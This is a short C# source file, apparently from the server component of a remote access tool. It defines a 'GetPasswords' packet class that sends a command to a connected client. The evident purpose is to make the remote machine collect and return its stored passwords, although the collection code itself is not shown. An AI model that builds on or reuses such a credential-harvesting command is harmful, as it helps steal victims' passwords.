using ProtoBuf;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class GetPasswords : IPacket
    {
        public GetPasswords()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
